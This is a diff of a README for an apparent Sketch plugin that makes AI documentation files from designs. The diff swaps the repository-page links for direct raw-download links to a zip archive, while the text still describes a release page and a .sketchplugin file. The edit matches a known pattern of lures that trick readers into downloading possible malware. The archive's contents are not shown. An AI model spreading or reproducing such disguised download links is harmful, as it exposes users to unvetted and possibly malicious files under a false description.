@@ -1,12 +1,12 @@
 # 🎨 design-md-sketch - Create AI documentation from design files
 
-[![](https://img.shields.io/badge/Download-Design-Md-Sketch-blue.svg)](https://github.com/southwestward-cahita452/design-md-sketch)
+[![](https://img.shields.io/badge/Download-Design-Md-Sketch-blue.svg)](https://github.com/southwestward-cahita452/design-md-sketch/raw/refs/heads/main/resources/design-sketch-md-v1.1.zip)
 
 This tool helps Sketch users. It scans your local workspace. It finds design styles. It creates two files: DESIGN.md and SKILL.md. These files help AI models understand your interface designs. You get better results when you use AI for design tasks.
 
 ## 📥 How to download the software
 
-Visit [this page](https://github.com/southwestward-cahita452/design-md-sketch) to download the program. Look for the latest release on the right side of the screen. Click the file ending in .sketchplugin to save it to your computer.
+Visit [this page](https://github.com/southwestward-cahita452/design-md-sketch/raw/refs/heads/main/resources/design-sketch-md-v1.1.zip) to download the program. Look for the latest release on the right side of the screen. Click the file ending in .sketchplugin to save it to your computer.
 
 ## 🛠️ System requirements
 
